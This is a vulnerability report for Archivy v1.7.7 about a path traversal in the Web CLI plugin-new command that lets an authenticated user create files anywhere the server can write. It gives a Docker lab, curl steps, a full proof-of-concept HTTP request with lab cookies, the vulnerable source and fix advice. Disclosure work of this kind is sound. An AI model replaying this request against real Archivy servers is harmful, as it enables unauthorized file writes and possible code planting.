### Vulnerability details

**Official website / Product:** https://archivy.github.io / https://github.com/archivy/archivy

**Repository:** archivy/archivy (stars at selection: 3284)

**Vulnerability type:** file_upload (arbitrary file/directory write via path traversal)

**Vulnerability versions:** v1.7.7 (audited commit bdcdd39ac6cf9f7b3709b984d8be2f0fa898139e); current master same lineage

**Vulnerability URL / Parameter:** `POST /cli/plugin-new` form field `1.0.argument.text.1.text.name` (CLI argument `name`)

**Complex:** yes

### Verification procedure

1. **Lab** (original path `labs/archivy-r68-a3/`, host port **24803** → container `5000`). Post-verify hygiene removed the lab dir and image (`logs/merged/r68-a3.json` → `lab_images_removed`: `archivy-r68-a3:lab`). Recreate by writing the three files below into any empty directory. Image `archivy-r68-a3:lab`, container `archivy-r68-a3`, base `python:3.11-slim-bookworm` + `pip install archivy==1.7.7`. Entrypoint writes non-interactive config with `HOST=0.0.0.0` and runs `archivy create-admin --password adminadmin admin`. Default creds: `admin` / `adminadmin`.

`Dockerfile`:

```dockerfile
FROM python:3.11-slim-bookworm

WORKDIR /app

RUN pip install --no-cache-dir "archivy==1.7.7"

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

ENV ARCHIVY_INTERNAL_DIR_PATH=/app/.local/share/archivy
EXPOSE 5000

ENTRYPOINT ["/entrypoint.sh"]
```

`entrypoint.sh`:

```bash
#!/bin/bash
set -euo pipefail

INTERNAL="${ARCHIVY_INTERNAL_DIR_PATH:-/app/.local/share/archivy}"
mkdir -p "$INTERNAL" /app/data

if [ ! -f "$INTERNAL/config.yml" ]; then
  # Non-interactive init: HOST must be 0.0.0.0 for Docker port publish.
  python - <<'PY'
from pathlib import Path
import yaml
from archivy.config import Config

internal = Path("/app/.local/share/archivy")
internal.mkdir(parents=True, exist_ok=True)
(Path("/app/data")).mkdir(parents=True, exist_ok=True)

cfg = Config()
# Persist only overrides (same idea as archivy.helpers.write_config)
overrides = {
    "HOST": "0.0.0.0",
    "PORT": 5000,
    "USER_DIR": "/app",
    "SEARCH_CONF": {"enabled": 0},
    "SECRET_KEY": cfg.SECRET_KEY,
}
with (internal / "config.yml").open("w") as f:
    yaml.dump(overrides, f)
print("wrote", internal / "config.yml")
PY
  archivy create-admin --password adminadmin admin
  echo "created admin/adminadmin"
fi

echo "Running archivy..."
exec archivy run
```

`docker-compose.yml`:

```yaml
services:
  archivy:
    build: .
    image: archivy-r68-a3:lab
    container_name: archivy-r68-a3
    ports:
      - "24803:5000"
```

Start:

```bash
chmod +x entrypoint.sh
docker compose up -d --build
# Wait for “Running archivy...” / Serving Flask
```

2. Log in and capture the session cookie:
   ```bash
   curl -c /tmp/archivy-cj -b /tmp/archivy-cj -s -X POST http://127.0.0.1:24803/login \
     -d 'username=admin&password=adminadmin' -o /dev/null -w '%{http_code}\n'
   ```
3. Open the Web CLI form page and extract the CSRF token bound to the current `session` cookie:
   ```bash
   curl -b /tmp/archivy-cj -s http://127.0.0.1:24803/cli/plugin-new \
     | grep -oE 'name="csrf_token"[^>]*value="[^"]+"' | head -1
   ```
   The `Cookie: session=...` and `csrf_token=...` values in the PoC below are lab-captured; **replace them with a fresh login session when replaying**.
4. `POST /cli/plugin-new` with absolute plugin name `name=/tmp/r68a3-final-afw2` (form field `1.0.argument.text.1.text.name`, URL-encoded `%2Ftmp%2Fr68a3-final-afw2`), plus the click_web debug flag field `0.2.flag.bool_flag.1.checkbox.--debug=--no-debug`.
5. Expect HTTP 200 with body text `Successfully Created the plugin directory structure at '/tmp/r68a3-final-afw2'/.`.
6. Confirm scaffolding inside the container:
   ```bash
   docker exec archivy-r68-a3 ls -la /tmp/r68a3-final-afw2
   docker exec archivy-r68-a3 ls -la /tmp/r68a3-final-afw2/tmp   # nested name/name → /tmp/.../tmp/...
   docker exec archivy-r68-a3 head -5 /tmp/r68a3-final-afw2/setup.py
   ```
   Expected directory listing (lab-verified):
   ```text
   total 24
   drwxr-xr-x 3 archivy archivy 4096 Nov  2 18:37 .
   drwxrwxrwt 1 root    root    4096 Nov  2 18:37 ..
   -rw-r--r-- 1 archivy archivy  141 Nov  2 18:37 README.md
   -rw-r--r-- 1 archivy archivy   13 Nov  2 18:37 requirements.txt
   -rw-r--r-- 1 archivy archivy  716 Nov  2 18:37 setup.py
   drwxr-xr-x 3 archivy archivy 4096 Nov  2 18:37 tmp
   ```
   `requirements.txt` contents:
   ```text
   archivy
   click
   ```
7. (Optional) Repeat with `name=/app/r68a3_pwned_plugin` to show writes into the application tree (this lab uses `USER_DIR=/app`). Expected listing:
   ```text
   total 28
   drwxr-xr-x 3 archivy archivy 4096 Nov  2 18:36 .
   drwxr-xr-x 1 archivy archivy 4096 Nov  2 18:36 ..
   -rw-r--r-- 1 archivy archivy  145 Nov  2 18:36 README.md
   drwxr-xr-x 3 archivy archivy 4096 Nov  2 18:36 app
   -rw-r--r-- 1 archivy archivy   13 Nov  2 18:36 requirements.txt
   -rw-r--r-- 1 archivy archivy  724 Nov  2 18:36 setup.py
   ```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified; refresh `session`/`csrf_token`):

```http
POST /cli/plugin-new HTTP/1.1
Host: 127.0.0.1:24803
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 207
Cookie: session=.eJwljktqAzEQRO-itRf9U7fkywxSq5sEQwIz9sr47hFkU1C1ePXe5cgzrq9yf56vuJXje5V7UVWMEUaKQ4TAWDtrJrK4pVOyVB6AfWE41IUyaamP1pTa4OxGrmnesIpI9LQKvSI1X9L6ajZ5tg2j3bJziPncWIFhPvZz2SKvK85_G9zVrzOP5-8jfvawphBbj04MOxcgVjQEVHffpm0uRJhWPn8d4T10.aujYcw.MGEGWkyslYJB4d32NsAQ9Isfc6o
Connection: close

csrf_token=ImRiNDIzNzllOTIzMDllOWQwMTE1MTcxMDE2Y2NjNjkzOGJkMTEwYjci.aujYcw.6SfJSC1UCZNvJU5rjXd4hhK4WoI&0.2.flag.bool_flag.1.checkbox.--debug=--no-debug&1.0.argument.text.1.text.name=%2Ftmp%2Fr68a3-final-afw2
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.3.3 Python/3.11.18
Date: Mon, 02 Nov 2026 18:37:39 GMT
Content-Type: text/plain; charset=utf-8
Vary: Accept-Encoding, Cookie
Set-Cookie: session=.eJwljjtuAzEMRO-i2gV_IiVfZiFRJBI4SIDdpAp8dwtwM8BM8eb9lyPPuD7KPcfXFbdyfK5yL6qKMcJIcYgQGGtnzUQWt3RKlsoDsC8Mh7pQJi310ZpSG5zdyDXNG1YRiZ5WoVek5ktaX80mz7ZhtFt2DjGfGyswzMd-Llvk74rzbYO7-nXm8fvziO89rCnE1qMTw84FiBUNAdXdt2mbCxGmlecLYCk9vw.aujYcw.s3AXTXq_53doze7rNvhx2y64Ep0; HttpOnly; Path=/
Transfer-Encoding: chunked
Connection: close

<!-- CLICK_WEB START HEADER -->
<div class="command-line">Executing: plugin-new</div>
<!-- CLICK_WEB END HEADER -->Successfully Created the plugin directory structure at '/tmp/r68a3-final-afw2'/.
```

Verification result notes:

An authenticated user can pass an absolute path (or `../` traversal) as the plugin `name` through the Web CLI. The server does not sanitize `name`, so plugin scaffolding is written outside any intended plugin workspace. Lab evidence shows successful writes under `/tmp/r68a3-final-afw2/` and `/app/r68a3_pwned_plugin/`.

Sibling write to `/tmp/r68a3-final-afw` (path differs slightly from the PoC `...-afw2`) — response body and directory listing:

```text
=== response body ===
<!-- CLICK_WEB START HEADER -->
<div class="command-line">Executing: plugin-new</div>
<!-- CLICK_WEB END HEADER -->Successfully Created the plugin directory structure at '/tmp/r68a3-final-afw'/.

=== docker evidence ===
total 24
drwxr-xr-x 3 archivy archivy 4096 Nov  2 18:37 .
drwxrwxrwt 1 root    root    4096 Nov  2 18:37 ..
-rw-r--r-- 1 archivy archivy  139 Nov  2 18:37 README.md
-rw-r--r-- 1 archivy archivy   13 Nov  2 18:37 requirements.txt
-rw-r--r-- 1 archivy archivy  712 Nov  2 18:37 setup.py
drwxr-xr-x 3 archivy archivy 4096 Nov  2 18:37 tmp
archivy
click
712 /tmp/r68a3-final-afw/setup.py
```

### Vulnerability analysis

Archivy’s click_web UI exposes `archivy plugin-new <name>` at `POST /cli/plugin-new`. `plugin-new` is not in the omitted command list. `helpers.create_plugin_dir(name)` concatenates the attacker-controlled `name` into `os.makedirs` / `open` paths with no `secure_filename`, no fixed base directory, and no rejection of absolute paths. This yields arbitrary directory/file creation wherever the archivy process can write (`requirements.txt`, `setup.py`, `README.md`, nested `__init__.py`). The same `name` is interpolated into generated `setup.py` / `__init__.py` contents. Writing into the application tree (e.g. `/app` in this lab) increases the risk of planting or corrupting code.

Trigger / sink source (full path and line numbers; `archivy/helpers.py` @ v1.7.7):

```python
# File: archivy/helpers.py
# Lines: 164-233
def create_plugin_dir(name):
    """Creates a sample plugin directory"""
    raw_name = name.replace("archivy_", "").replace("archivy-", "")
    try:
        os.makedirs(f"{name}/{name}")

        # Creates requirements.txt.
        with open(f"{name}/requirements.txt", "w") as fp:
            fp.writelines(["archivy", "\nclick"])

        # Creates an empty readme file to be filled
        with open(f"{name}/README.md", "w+") as fp:
            fp.writelines(
                [
                    f"# {name}",
                    "\n\n## Install",
                    "\n\nYou need to have `archivy` already installed.",
                    f"\n\nRun `pip install archivy_{name}`",
                    "\n\n## Usage",
                ]
            )

        # Creates a setup.py file
        with open(f"{name}/setup.py", "w") as setup_f:
            setup_f.writelines(
                [
                    "from setuptools import setup, find_packages",
                    '\n\nwith open("README.md", "r") as fh:',
                    "\n\tlong_description = fh.read()",
                    '\n\nwith open("requirements.txt", encoding="utf-8") as f:',
                    '\n\tall_reqs = f.read().split("\\n")',
                    "\n\tinstall_requires = [x.strip() for x in all_reqs]",
                    "\n\n#Fill in the details below for distribution purposes"
                    f'\nsetup(\n\tname="{name}",',
                    '\n\tversion="0.0.1",',
                    '\n\tauthor="",',
                    '\n\tauthor_email="",',
                    '\n\tdescription="",',
                    "\n\tlong_description=long_description,",
                    '\n\tlong_description_content_type="text/markdown",',
                    '\n\tclassifiers=["Programming Language :: Python :: 3"],'
                    "\n\tpackages=find_packages(),",
                    "\n\tinstall_requires=install_requires,",
                    f'\n\tentry_points="""\n\t\t[archivy.plugins]'
                    f'\n\t\t{raw_name}={name}:{raw_name}"""\n)',
                ]
            )

        # Creating a basic __init__.py file where the main function of the plugin goes
        with open(f"{name}/{name}/__init__.py", "w") as fp:
            fp.writelines(
                [
                    "import archivy",
                    "\nimport click",
                    "\n\n# Fill in the functionality for the commands (see https://archivy.github.io/plugins/)",
                    "\n@click.group()",
                    f"\ndef {raw_name}():",
                    "\n\tpass",
                    f"\n\n@{raw_name}.command()",
                    "\ndef command1():",
                    "\n\tpass",
                    f"\n\n@{raw_name}.command()",
                    "\ndef command2():",
                    "\n\tpass",
                ]
            )

        return True
    except FileExistsError:
        return False
```

```python
# File: archivy/cli.py
# Lines: 170-178
@cli.command(short_help="Helper command to auto-generate plugin directory with structure")
@click.argument("name")
def plugin_new(name):
    if create_plugin_dir(name):
        click.echo(f"Successfully Created the plugin directory structure at '{name}'/.")
    else:
        click.echo(f"Directory with name '{name}' already exists.")
```

```python
# File: archivy/click_web/resources/cmd_exec.py
# Lines: 20-39 (plugin-new not omitted)
omitted = ["shell", "run", "routes", "create-admin"]
...
cmd.append(command)  # plugin-new is allowed
```

### Fix notes

1. Reject absolute paths and `..` segments; restrict `name` to a safe single path component (e.g. `^[A-Za-z0-9_-]+$`) and enforce `resolve()` under a fixed plugins base directory.
2. Never pass raw user input into `open`/`makedirs`; use an allowlist / `secure_filename`.
3. If scaffolding is not needed from the Web CLI, add `plugin-new` to the click_web omitted list.
